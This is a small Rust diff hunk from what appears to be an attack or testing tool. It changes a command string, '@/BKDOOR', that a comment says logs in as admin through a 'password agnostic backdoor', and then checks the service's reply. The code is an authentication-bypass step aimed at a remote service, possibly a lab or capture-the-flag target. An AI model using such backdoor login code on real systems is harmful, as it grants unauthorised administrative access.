@@ -323,7 +323,7 @@ fn main() {
         }
         // time to login as admin through a password agnostic backdoor process
         stage = ProcessResult::LoginFailure;
-        let cmd = "@&1/BKDOOR".to_string();
+        let cmd = "@/BKDOOR".to_string();
         vanish_if_false!(ctx.send_cmd(cmd));
         let reply = ctx.read_till_cr();
         let reply = ctx.check_reply_against(reply, r"/BKDOOR", "BKDOOR");
